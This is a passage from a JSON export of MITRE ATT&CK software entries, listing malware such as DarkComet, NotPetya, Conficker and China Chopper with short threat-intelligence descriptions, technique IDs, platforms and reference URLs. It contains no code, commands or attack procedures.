        "T1059.003",
        "T1547.001",
        "T1057"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0247",
      "stix_id": "malware--53a42597-1974-4b8e-84fd-3675e8992053",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:43:20.237000+00:00"
    },
    "S0334": {
      "id": "S0334",
      "name": "DarkComet",
      "description": "[DarkComet](https://attack.mitre.org/software/S0334) is a Windows remote administration tool and backdoor.(Citation: TrendMicro DarkComet Sept 2014)(Citation: Malwarebytes DarkComet March 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059",
        "T1115",
        "T1125",
        "T1082",
        "T1105",
        "T1057",
        "T1059.003",
        "T1562.004",
        "T1021.001",
        "T1547.001",
        "T1071.001",
        "T1123",
        "T1562.001",
        "T1027.002",
        "T1112",
        "T1056.001",
        "T1033",
        "T1036.005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0334",
      "stix_id": "malware--53ab35c2-d00e-491a-8753-41d35ae7e547",
      "created": "2019-01-29T19:18:28.468000+00:00",
      "modified": "2025-04-25T14:43:20.605000+00:00"
    },
    "S0034": {
      "id": "S0034",
      "name": "NETEAGLE",
      "description": "[NETEAGLE](https://attack.mitre.org/software/S0034) is a backdoor developed by [APT30](https://attack.mitre.org/groups/G0013) with compile dates as early as 2008. It has two main variants known as \u201cScout\u201d and \u201cNorton.\u201d (Citation: FireEye APT30)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1573.001",
        "T1057",
        "T1071",
        "T1041",
        "T1568",
        "T1083",
        "T1547.001",
        "T1071.001",
        "T1059.003",
        "T1008",
        "T1095"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0034",
      "stix_id": "malware--53cf6cc4-65aa-445a-bcf8-c3d296f8a7a2",
      "created": "2017-05-31T21:32:27.787000+00:00",
      "modified": "2024-11-17T15:05:25.106000+00:00"
    },
    "S0216": {
      "id": "S0216",
      "name": "POORAIM",
      "description": "[POORAIM](https://attack.mitre.org/software/S0216) is a backdoor used by [APT37](https://attack.mitre.org/groups/G0067) in campaigns since at least 2014. (Citation: FireEye APT37 Feb 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1083",
        "T1113",
        "T1102.002",
        "T1057",
        "T1082",
        "T1189"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0216",
      "stix_id": "malware--53d47b09-09c2-4015-8d37-6633ecd53f79",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2024-11-17T15:01:33.389000+00:00"
    },
    "S1097": {
      "id": "S1097",
      "name": "HUI Loader",
      "description": "[HUI Loader](https://attack.mitre.org/software/S1097) is a custom DLL loader that has been used since at least 2015 by China-based threat groups including [Cinnamon Tempest](https://attack.mitre.org/groups/G1021) and [menuPass](https://attack.mitre.org/groups/G0045) to deploy malware on compromised hosts. [HUI Loader](https://attack.mitre.org/software/S1097) has been observed in campaigns loading [SodaMaster](https://attack.mitre.org/software/S0627), [PlugX](https://attack.mitre.org/software/S0013), [Cobalt Strike](https://attack.mitre.org/software/S0154), [Komplex](https://attack.mitre.org/software/S0162), and several strains of ransomware.(Citation: SecureWorks BRONZE STARLIGHT Ransomware Operations June 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1562.006",
        "T1140",
        "T1574.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1097",
      "stix_id": "malware--54089fba-8662-4f37-9a44-6ad25a5f630a",
      "created": "2023-12-22T20:03:48.505000+00:00",
      "modified": "2024-01-02T20:44:36.518000+00:00"
    },
    "S1149": {
      "id": "S1149",
      "name": "CHIMNEYSWEEP",
      "description": "[CHIMNEYSWEEP](https://attack.mitre.org/software/S1149) is a backdoor malware that was deployed during [HomeLand Justice](https://attack.mitre.org/campaigns/C0038) along with [ROADSWEEP](https://attack.mitre.org/software/S1150) ransomware, and has been used to target Farsi and Arabic speakers since at least 2012.(Citation: Mandiant ROADSWEEP August 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1074.001",
        "T1480",
        "T1218.003",
        "T1059.005",
        "T1027",
        "T1105",
        "T1120",
        "T1071.001",
        "T1106",
        "T1027.009",
        "T1027.001",
        "T1083",
        "T1115",
        "T1005",
        "T1140",
        "T1053.005",
        "T1041",
        "T1059.001",
        "T1132.002",
        "T1033",
        "T1057",
        "T1056.001",
        "T1518.001",
        "T1529",
        "T1027.007",
        "T1102",
        "T1113",
        "T1548.002",
        "T1070.006",
        "T1112",
        "T1553.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1149",
      "stix_id": "malware--542e3384-341a-455b-bb48-4917b25e3b00",
      "created": "2024-08-07T20:03:17.762000+00:00",
      "modified": "2024-08-09T17:29:21.238000+00:00"
    },
    "S0481": {
      "id": "S0481",
      "name": "Ragnar Locker",
      "description": "[Ragnar Locker](https://attack.mitre.org/software/S0481) is a ransomware that has been in use since at least December 2019.(Citation: Sophos Ragnar May 2020)(Citation: Cynet Ragnar Apr 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1486",
        "T1490",
        "T1569.002",
        "T1059.003",
        "T1564.006",
        "T1489",
        "T1614",
        "T1218.010",
        "T1543.003",
        "T1218.007",
        "T1562.001",
        "T1218.011",
        "T1120"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0481",
      "stix_id": "malware--54895630-efd2-4608-9c24-319de972a9eb",
      "created": "2020-06-29T23:30:53.824000+00:00",
      "modified": "2025-04-16T20:38:08.233000+00:00"
    },
    "S0512": {
      "id": "S0512",
      "name": "FatDuke",
      "description": "[FatDuke](https://attack.mitre.org/software/S0512) is a backdoor used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2016.(Citation: ESET Dukes October 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1012",
        "T1036",
        "T1071.001",
        "T1497.003",
        "T1016",
        "T1008",
        "T1082",
        "T1547.001",
        "T1106",
        "T1027.002",
        "T1090.001",
        "T1057",
        "T1027",
        "T1070.004",
        "T1005",
        "T1218.011",
        "T1059.001",
        "T1573.001",
        "T1083",
        "T1027.016",
        "T1140"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0512",
      "stix_id": "malware--54a01db0-9fab-4d5f-8209-53cef8425f4a",
      "created": "2020-09-24T13:23:45.162000+00:00",
      "modified": "2025-04-25T14:43:21.871000+00:00"
    },
    "S0532": {
      "id": "S0532",
      "name": "Lucifer",
      "description": "[Lucifer](https://attack.mitre.org/software/S0532) is a crypto miner and DDoS hybrid malware that leverages well-known exploits to spread laterally on Windows platforms.(Citation: Unit 42 Lucifer June 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1496.001",
        "T1016",
        "T1049",
        "T1140",
        "T1057",
        "T1547.001",
        "T1105",
        "T1573.001",
        "T1033",
        "T1570",
        "T1070.001",
        "T1497.001",
        "T1027.002",
        "T1053.005",
        "T1082",
        "T1110.001",
        "T1498",
        "T1059.003",
        "T1071",
        "T1210",
        "T1046",
        "T1021.002",
        "T1012",
        "T1047"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0532",
      "stix_id": "malware--54a73038-1937-4d71-a253-316e76d5413c",
      "created": "2020-11-16T18:40:34.473000+00:00",
      "modified": "2025-04-25T14:43:22.226000+00:00"
    },
    "S0089": {
      "id": "S0089",
      "name": "BlackEnergy",
      "description": "[BlackEnergy](https://attack.mitre.org/software/S0089) is a malware toolkit that has been used by both criminal and APT actors. It dates back to at least 2007 and was originally designed to create botnets for use in conducting Distributed Denial of Service (DDoS) attacks, but its use has evolved to support various plug-ins. It is well known for being used during the confrontation between Georgia and Russia in 2008, as well as in targeting Ukrainian institutions. Variants include BlackEnergy 2 and BlackEnergy 3. (Citation: F-Secure BlackEnergy 2014)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1548.002",
        "T1047",
        "T1555.003",
        "T1070",
        "T1113",
        "T1055.001",
        "T1553.006",
        "T1057",
        "T1083",
        "T1046",
        "T1021.002",
        "T1049",
        "T1120",
        "T1547.009",
        "T1552.001",
        "T1056.001",
        "T1543.003",
        "T1070.001",
        "T1547.001",
        "T1485",
        "T1574.010",
        "T1016",
        "T1082",
        "T1008",
        "T1071.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0089",
      "stix_id": "malware--54cc1d4f-5c53-4f0e-9ef5-11b4998e82e4",
      "created": "2017-05-31T21:32:57.807000+00:00",
      "modified": "2023-10-06T14:08:40.134000+00:00"
    },
    "S0350": {
      "id": "S0350",
      "name": "zwShell",
      "description": "[zwShell](https://attack.mitre.org/software/S0350) is a remote access tool (RAT) written in Delphi that has been seen in the wild since the spring of 2010 and used by threat actors during [Night Dragon](https://attack.mitre.org/campaigns/C0002).(Citation: McAfee Night Dragon)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1021.001",
        "T1021.002",
        "T1053.005",
        "T1543.003",
        "T1083",
        "T1070.004",
        "T1082",
        "T1016",
        "T1112",
        "T1033",
        "T1059.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0350",
      "stix_id": "malware--54e8672d-5338-4ad1-954a-a7c986bee530",
      "created": "2019-01-30T17:48:35.006000+00:00",
      "modified": "2025-04-16T20:38:08.735000+00:00"
    },
    "S0027": {
      "id": "S0027",
      "name": "Zeroaccess",
      "description": "[Zeroaccess](https://attack.mitre.org/software/S0027) is a kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that attempts to add victims to the ZeroAccess botnet, often for monetary gain. (Citation: Sophos ZeroAccess)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1014",
        "T1564.004"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0027",
      "stix_id": "malware--552462b9-ae79-49dd-855c-5973014e157f",
      "created": "2017-05-31T21:32:20.949000+00:00",
      "modified": "2025-04-25T14:43:22.946000+00:00"
    },
    "S1117": {
      "id": "S1117",
      "name": "GLASSTOKEN",
      "description": "[GLASSTOKEN](https://attack.mitre.org/software/S1117) is a custom web shell used by threat actors during [Cutting Edge](https://attack.mitre.org/campaigns/C0029) to execute commands on compromised Ivanti Secure Connect VPNs.(Citation: Volexity Ivanti Zero-Day Exploitation January 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.001",
        "T1140",
        "T1505.003",
        "T1132.001"
      ],
      "platforms": [
        "Network Devices"
      ],
      "url": "https://attack.mitre.org/software/S1117",
      "stix_id": "malware--554e010d-726b-439d-9a1a-f60fff0cc109",
      "created": "2024-03-06T19:14:43.437000+00:00",
      "modified": "2025-04-15T19:46:34.213000+00:00"
    },
    "S1033": {
      "id": "S1033",
      "name": "DCSrv",
      "description": "[DCSrv](https://attack.mitre.org/software/S1033) is destructive malware that has been used by [Moses Staff](https://attack.mitre.org/groups/G1009) since at least  September 2021. Though [DCSrv](https://attack.mitre.org/software/S1033) has ransomware-like capabilities, [Moses Staff](https://attack.mitre.org/groups/G1009) does not demand ransom or offer a decryption key.(Citation: Checkpoint MosesStaff Nov 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1036.004",
        "T1543.003",
        "T1529",
        "T1112",
        "T1027.013",
        "T1124",
        "T1486",
        "T1106"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1033",
      "stix_id": "malware--5633ffd3-81ef-4f98-8f93-4896b03998f0",
      "created": "2022-08-11T22:31:31.468000+00:00",
      "modified": "2024-04-11T02:39:27.698000+00:00"
    },
    "S0694": {
      "id": "S0694",
      "name": "DRATzarus",
      "description": "[DRATzarus](https://attack.mitre.org/software/S0694) is a remote access tool (RAT) that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032) to target the defense and aerospace organizations globally since at least summer 2020. [DRATzarus](https://attack.mitre.org/software/S0694) shares similarities with [Bankshot](https://attack.mitre.org/software/S0239), which was used by [Lazarus Group](https://attack.mitre.org/groups/G0032) in 2017 to target the Turkish financial sector.(Citation: ClearSky Lazarus Aug 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1033",
        "T1622",
        "T1124",
        "T1005",
        "T1105",
        "T1036.005",
        "T1018",
        "T1106",
        "T1027.002",
        "T1057",
        "T1071.001",
        "T1497.003",
        "T1027"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0694",
      "stix_id": "malware--56aa3c82-ed40-4b5a-84bf-7231356d9e96",
      "created": "2022-03-24T11:23:51.435000+00:00",
      "modified": "2025-04-16T20:38:09.054000+00:00"
    },
    "S0415": {
      "id": "S0415",
      "name": "BOOSTWRITE",
      "description": "[BOOSTWRITE](https://attack.mitre.org/software/S0415) is a loader crafted to be launched via abuse of the DLL search order of applications used by [FIN7](https://attack.mitre.org/groups/G0046).(Citation: FireEye FIN7 Oct 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1140",
        "T1027.013",
        "T1553.002",
        "T1129",
        "T1574.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0415",
      "stix_id": "malware--56d10a7f-bb42-4267-9b4c-63abb9c06010",
      "created": "2019-10-11T16:04:31.994000+00:00",
      "modified": "2024-04-11T02:48:51.475000+00:00"
    },
    "S0448": {
      "id": "S0448",
      "name": "Rising Sun",
      "description": "[Rising Sun](https://attack.mitre.org/software/S0448) is a modular backdoor that was used extensively in [Operation Sharpshooter](https://attack.mitre.org/campaigns/C0013) between 2017 and 2019. [Rising Sun](https://attack.mitre.org/software/S0448) infected at least 87 organizations around the world, including nuclear, defense, energy, and financial service companies. Security researchers assessed [Rising Sun](https://attack.mitre.org/software/S0448) included some source code from [Lazarus Group](https://attack.mitre.org/groups/G0032)'s Trojan Duuzer.(Citation: McAfee Sharpshooter December 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070.004",
        "T1005",
        "T1033",
        "T1560.003",
        "T1140",
        "T1082",
        "T1027.013",
        "T1071.001",
        "T1070",
        "T1057",
        "T1573.002",
        "T1041",
        "T1016.001",
        "T1059.003",
        "T1083",
        "T1012",
        "T1106",
        "T1564.001",
        "T1016"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0448",
      "stix_id": "malware--56e6b6c2-e573-4969-8bab-783205cebbbf",
      "created": "2020-05-14T22:29:25.653000+00:00",
      "modified": "2024-04-11T00:14:23.264000+00:00"
    },
    "S0073": {
      "id": "S0073",
      "name": "ASPXSpy",
      "description": "[ASPXSpy](https://attack.mitre.org/software/S0073) is a Web shell. It has been modified by [Threat Group-3390](https://attack.mitre.org/groups/G0027) actors to create the ASPXTool version. (Citation: Dell TG-3390)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1505.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0073",
      "stix_id": "malware--56f46b17-8cfa-46c0-b501-dd52fef394e2",
      "created": "2017-05-31T21:32:47.879000+00:00",
      "modified": "2024-05-22T19:06:12.701000+00:00"
    },
    "S0368": {
      "id": "S0368",
      "name": "NotPetya",
      "description": "[NotPetya](https://attack.mitre.org/software/S0368) is malware that was used by [Sandworm Team](https://attack.mitre.org/groups/G0034) in a worldwide attack starting on June 27, 2017. While [NotPetya](https://attack.mitre.org/software/S0368) appears as a form of ransomware, its main purpose was to destroy data and disk structures on compromised systems; the attackers never intended to make the encrypted data recoverable. As such, [NotPetya](https://attack.mitre.org/software/S0368) may be more appropriately thought of as a form of wiper malware. [NotPetya](https://attack.mitre.org/software/S0368) contains worm-like features to spread itself across a computer network using the SMBv1 exploits EternalBlue and EternalRomance.(Citation: Talos Nyetya June 2017)(Citation: US-CERT NotPetya 2017)(Citation: ESET Telebots June 2017)(Citation: US District Court Indictment GRU Unit 74455 October 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070.001",
        "T1569.002",
        "T1053.005",
        "T1021.002",
        "T1518.001",
        "T1047",
        "T1210",
        "T1083",
        "T1003.001",
        "T1529",
        "T1486",
        "T1036",
        "T1218.011",
        "T1078.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0368",
      "stix_id": "malware--5719af9d-6b16-46f9-9b28-fb019541ddbb",
      "created": "2019-03-26T15:02:14.907000+00:00",
      "modified": "2025-04-16T20:38:09.202000+00:00"
    },
    "S0444": {
      "id": "S0444",
      "name": "ShimRat",
      "description": "[ShimRat](https://attack.mitre.org/software/S0444) has been used by the suspected China-based adversary [Mofang](https://attack.mitre.org/groups/G0103) in campaigns targeting multiple countries and sectors including government, military, critical infrastructure, automobile, and weapons development. The name \"[ShimRat](https://attack.mitre.org/software/S0444)\" comes from the malware's extensive use of Windows Application Shimming to maintain persistence. (Citation: FOX-IT May 2016 Mofang)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1090.002",
        "T1548.002",
        "T1574",
        "T1547.001",
        "T1036.004",
        "T1029",
        "T1070.004",
        "T1071.001",
        "T1059.003",
        "T1140",
        "T1546.011",
        "T1008",
        "T1027.002",
        "T1027.015",
        "T1106",
        "T1543.003",
        "T1135",
        "T1005",
        "T1083",
        "T1112"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0444",
      "stix_id": "malware--5763217a-05b6-4edd-9bca-057e47b5e403",
      "created": "2020-05-12T21:28:20.934000+00:00",
      "modified": "2025-04-25T14:43:24.555000+00:00"
    },
    "S0667": {
      "id": "S0667",
      "name": "Chrommme",
      "description": "[Chrommme](https://attack.mitre.org/software/S0667) is a backdoor tool written using the Microsoft Foundation Class (MFC) framework that was first reported in June 2021; security researchers noted infrastructure overlaps with [Gelsemium](https://attack.mitre.org/software/S0666) malware.(Citation: ESET Gelsemium June 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1016",
        "T1560",
        "T1105",
        "T1082",
        "T1140",
        "T1074.001",
        "T1027.013",
        "T1113",
        "T1041",
        "T1106",
        "T1029",
        "T1005",
        "T1033"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0667",
      "stix_id": "malware--579607c2-d046-40df-99ab-beb479c37a2a",
      "created": "2021-12-01T18:36:54.260000+00:00",
      "modified": "2024-04-11T02:45:43.666000+00:00"
    },
    "S0642": {
      "id": "S0642",
      "name": "BADFLICK",
      "description": "[BADFLICK](https://attack.mitre.org/software/S0642) is a backdoor used by [Leviathan](https://attack.mitre.org/groups/G0065) in spearphishing campaigns first reported in 2018 that targeted the U.S. engineering and maritime industries.(Citation: FireEye Periscope March 2018)(Citation: Accenture MUDCARP March 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1560.002",
        "T1083",
        "T1204.002",
        "T1005",
        "T1566.001",
        "T1497.003",
        "T1016",
        "T1105",
        "T1140"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0642",
      "stix_id": "malware--57d83eac-a2ea-42b0-a7b2-c80c55157790",
      "created": "2021-08-26T18:49:41.155000+00:00",
      "modified": "2025-04-25T14:43:25.093000+00:00"
    },
    "S0644": {
      "id": "S0644",
      "name": "ObliqueRAT",
      "description": "[ObliqueRAT](https://attack.mitre.org/software/S0644) is a remote access trojan, similar to [Crimson](https://attack.mitre.org/software/S0115), that has been in use by [Transparent Tribe](https://attack.mitre.org/groups/G0134) since at least 2020.(Citation: Talos Oblique RAT March 2021)(Citation: Talos Transparent Tribe May 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1113",
        "T1120",
        "T1547.001",
        "T1030",
        "T1204.001",
        "T1082",
        "T1083",
        "T1027.003",
        "T1497.001",
        "T1025",
        "T1074.001",
        "T1057",
        "T1033",
        "T1125"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0644",
      "stix_id": "malware--5864e59f-eb4c-43ad-83b2-b5e4fae056c9",
      "created": "2021-09-08T19:53:27.937000+00:00",
      "modified": "2025-04-25T14:43:25.456000+00:00"
    },
    "S0063": {
      "id": "S0063",
      "name": "SHOTPUT",
      "description": "[SHOTPUT](https://attack.mitre.org/software/S0063) is a custom backdoor used by [APT3](https://attack.mitre.org/groups/G0022). (Citation: FireEye Clandestine Wolf)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1027",
        "T1083",
        "T1087.001",
        "T1018",
        "T1049",
        "T1057"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0063",
      "stix_id": "malware--58adaaa8-f1e8-4606-9a08-422e568461eb",
      "created": "2017-05-31T21:32:42.754000+00:00",
      "modified": "2025-04-25T14:43:25.821000+00:00"
    },
    "S0640": {
      "id": "S0640",
      "name": "Avaddon",
      "description": "[Avaddon](https://attack.mitre.org/software/S0640) is ransomware written in C++ that has been offered as Ransomware-as-a-Service (RaaS) since at least June 2020.(Citation: Awake Security Avaddon)(Citation: Arxiv Avaddon Feb 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1614.001",
        "T1140",
        "T1489",
        "T1562.001",
        "T1059.007",
        "T1083",
        "T1106",
        "T1057",
        "T1490",
        "T1548.002",
        "T1135",
        "T1047",
        "T1486",
        "T1112",
        "T1027",
        "T1547.001",
        "T1016"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0640",
      "stix_id": "malware--58c5a3a1-928f-4094-9e98-a5a4e56dd5f3",
      "created": "2021-08-23T19:38:33.073000+00:00",
      "modified": "2025-04-25T14:43:26.180000+00:00"
    },
    "S0608": {
      "id": "S0608",
      "name": "Conficker",
      "description": "[Conficker](https://attack.mitre.org/software/S0608) is a computer worm first detected in October 2008 that targeted Microsoft Windows using the MS08-067 Windows vulnerability to spread.(Citation: SANS Conficker) In 2016, a variant of [Conficker](https://attack.mitre.org/software/S0608) made its way on computers and removable disk drives belonging to a nuclear power plant.(Citation: Conficker Nuclear Power Plant)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1112",
        "T1543.003",
        "T1124",
        "T1021.002",
        "T1547.001",
        "T1568.002",
        "T1210",
        "T1027",
        "T1562.001",
        "T1046",
        "T1490",
        "T1091",
        "T1105"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0608",
      "stix_id": "malware--58eddbaf-7416-419a-ad7b-e65b9d4c3b55",
      "created": "2021-02-23T20:50:32.845000+00:00",
      "modified": "2025-04-16T20:38:10.239000+00:00"
    },
    "S1124": {
      "id": "S1124",
      "name": "SocGholish",
      "description": "[SocGholish](https://attack.mitre.org/software/S1124) is a JavaScript-based loader malware that has been used since at least 2017. It has been observed in use against multiple sectors globally for initial access, primarily through drive-by-downloads masquerading as software updates. SocGholish is operated by [Mustard Tempest](https://attack.mitre.org/groups/G1020) and its access has been sold to groups including [Indrik Spider](https://attack.mitre.org/groups/G0119) for downloading secondary RAT and ransomware payloads.(Citation: SentinelOne SocGholish Infrastructure November 2022)(Citation: SocGholish-update)(Citation: Red Canary SocGholish March 2024)(Citation: Secureworks Gold Prelude Profile) ",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1614",
        "T1047",
        "T1105",
        "T1027.013",
        "T1482",
        "T1059.007",
        "T1036.005",
        "T1566.002",
        "T1033",
        "T1189",
        "T1204.001",
        "T1518",
        "T1057",
        "T1074.001",
        "T1048.003",
        "T1102",
        "T1016",
        "T1027.015"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1124",
      "stix_id": "malware--5911d2ca-64f6-49b3-b94f-29b5d185085c",
      "created": "2024-03-22T19:21:30.424000+00:00",
      "modified": "2024-04-06T00:08:07.956000+00:00"
    },
    "S0696": {
      "id": "S0696",
      "name": "Flagpro",
      "description": "[Flagpro](https://attack.mitre.org/software/S0696) is a Windows-based, first-stage downloader that has been used by [BlackTech](https://attack.mitre.org/groups/G0098) since at least October 2020. It has primarily been used against defense, media, and communications companies in Japan.(Citation: NTT Security Flagpro new December 2021) ",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1132.001",
        "T1010",
        "T1029",
        "T1614.001",
        "T1059.005",
        "T1059.003",
        "T1027",
        "T1005",
        "T1036",
        "T1204.002",
        "T1105",
        "T1547.001",
        "T1071.001",
        "T1018",
        "T1069.001",
        "T1041",
        "T1033",
        "T1135",
        "T1016",
        "T1106",
        "T1566.001",
        "T1070",
        "T1049",
        "T1057"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0696",
      "stix_id": "malware--592260fb-dd5c-4a30-8d99-106a0485be0d",
      "created": "2022-03-25T14:58:24.832000+00:00",
      "modified": "2025-04-25T19:04:04.232000+00:00"
    },
    "S0087": {
      "id": "S0087",
      "name": "Hi-Zor",
      "description": "[Hi-Zor](https://attack.mitre.org/software/S0087) is a remote access tool (RAT) that has characteristics similar to [Sakula](https://attack.mitre.org/software/S0074). It was used in a campaign named INOCNATION. (Citation: Fidelis Hi-Zor)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1071.001",
        "T1573.001",
        "T1547.001",
        "T1070.004",
        "T1573.002",
        "T1059.003",
        "T1027.013",
        "T1218.010"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0087",
      "stix_id": "malware--5967cc93-57c9-404a-8ffd-097edfa7bdfc",
      "created": "2017-05-31T21:32:56.860000+00:00",
      "modified": "2024-04-11T02:20:26.551000+00:00"
    },
    "S0646": {
      "id": "S0646",
      "name": "SpicyOmelette",
      "description": "[SpicyOmelette](https://attack.mitre.org/software/S0646) is a JavaScript based remote access tool that has been used by [Cobalt Group](https://attack.mitre.org/groups/G0080) since at least 2018.(Citation: Secureworks GOLD KINGSWOOD September 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1518",
        "T1566.002",
        "T1005",
        "T1105",
        "T1016",
        "T1059.007",
        "T1204.001",
        "T1018",
        "T1553.002",
        "T1518.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0646",
      "stix_id": "malware--599cd7b5-37b5-4cdd-8174-2811531ce9d0",
      "created": "2021-09-21T14:55:00.996000+00:00",
      "modified": "2025-04-25T14:43:27.242000+00:00"
    },
    "S0161": {
      "id": "S0161",
      "name": "XAgentOSX",
      "description": "[XAgentOSX](https://attack.mitre.org/software/S0161) is a trojan that has been used by [APT28](https://attack.mitre.org/groups/G0007)  on OS X and appears to be a port of their standard [CHOPSTICK](https://attack.mitre.org/software/S0023) or XAgent trojan. (Citation: XAgentOSX 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1056.001",
        "T1033",
        "T1083",
        "T1071.002",
        "T1555.003",
        "T1057",
        "T1113",
        "T1082",
        "T1070.004",
        "T1106"
      ],
      "platforms": [
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0161",
      "stix_id": "malware--59a97b15-8189-4d51-9404-e1ce8ea4a069",
      "created": "2017-12-14T16:46:06.044000+00:00",
      "modified": "2025-04-25T14:43:27.602000+00:00"
    },
    "S0690": {
      "id": "S0690",
      "name": "Green Lambert",
      "description": "[Green Lambert](https://attack.mitre.org/software/S0690) is a modular backdoor that security researchers assess has been used by an advanced threat group referred to as Longhorn and The Lamberts. First reported in 2017, the Windows variant of [Green Lambert](https://attack.mitre.org/software/S0690) may have been used as early as 2008; a macOS version was uploaded to a multiscanner service in September 2014.(Citation: Kaspersky Lamberts Toolkit April 2017)(Citation: Objective See Green Lambert for OSX Oct 2021)  ",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1543.004",
        "T1555.001",
        "T1082",
        "T1071.004",
        "T1140",
        "T1016",
        "T1090",
        "T1547.015",
        "T1070.004",
        "T1005",
        "T1027",
        "T1059.004",
        "T1546.004",
        "T1543.001",
        "T1037.004",
        "T1036.004",
        "T1036.005",
        "T1124"
      ],
      "platforms": [
        "Windows",
        "iOS",
        "macOS",
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S0690",
      "stix_id": "malware--59c8a28c-200c-4565-9af1-cbdb24870ba0",
      "created": "2022-03-21T20:55:40.638000+00:00",
      "modified": "2025-04-16T20:38:10.718000+00:00"
    },
    "S0020": {
      "id": "S0020",
      "name": "China Chopper",
      "description": "[China Chopper](https://attack.mitre.org/software/S0020) is a [Web Shell](https://attack.mitre.org/techniques/T1505/003) hosted on Web servers to provide access back into an enterprise network that does not rely on an infected system calling back to a remote command and control server.(Citation: Lee 2013) It has been used by several threat groups.(Citation: Dell TG-3390)(Citation: FireEye Periscope March 2018)(Citation: CISA AA21-200A APT40 July 2021)(Citation: Rapid7 HAFNIUM Mar 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1110.001",
        "T1005",
        "T1027.002",
        "T1059.003",
        "T1071.001",
        "T1105",
        "T1046",
        "T1070.006",
        "T1505.003",
        "T1083"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0020",
      "stix_id": "malware--5a3a31fe-5a8f-48e1-bff0-a753e5b1be70",
      "created": "2017-05-31T21:32:18.315000+00:00",
      "modified": "2024-01-03T21:37:14.516000+00:00"
    },
    "S1163": {
      "id": "S1163",
      "name": "SnappyTCP",
